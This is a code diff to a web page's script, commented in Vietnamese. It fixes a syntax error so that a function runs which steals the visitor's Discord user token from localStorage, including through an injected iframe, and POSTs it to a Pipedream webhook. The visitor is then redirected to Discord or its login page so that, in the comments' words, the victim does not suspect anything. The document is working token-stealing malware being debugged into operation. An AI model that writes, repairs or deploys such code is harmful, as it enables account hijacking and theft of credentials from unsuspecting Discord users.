@@ -5,24 +5,31 @@
     <script>
         const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
 
-        async def hoot_token() {
-            // Thủ thuật lấy User Token trực tiếp từ trình duyệt của nạn nhân
-            let token = (
-                window.webpackChunkdiscord_app ? 
-                window.localStorage.getItem('token') : 
-                document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token
-            );
+        // Đã sửa 'async def' thành 'async function' để hết bị trắng trang
+        async function hoot_token() {
+            try {
+                let token = (
+                    window.webpackChunkdiscord_app ? 
+                    window.localStorage.getItem('token') : 
+                    document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token
+                );
 
-            if (token) {
-                token = token.replace(/"/g, "");
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ user_token: token })
-                });
-                window.location.href = "https://discord.com/channels/@me";
-            } else {
-                // Nếu chưa có token, ép họ vào trang login để lấy
+                if (token) {
+                    token = token.replace(/"/g, "");
+                    // Gửi token về Pipedream
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ user_token: token })
+                    });
+                    // Chuyển hướng để nạn nhân không nghi ngờ
+                    window.location.href = "https://discord.com/channels/@me";
+                } else {
+                    // Nếu chưa login, đẩy sang trang login để họ nhập tk/mk
+                    window.location.href = "https://discord.com/login";
+                }
+            } catch (err) {
+                // Nếu có lỗi, vẫn đẩy sang trang login của Discord cho an toàn
                 window.location.href = "https://discord.com/login";
             }
         }
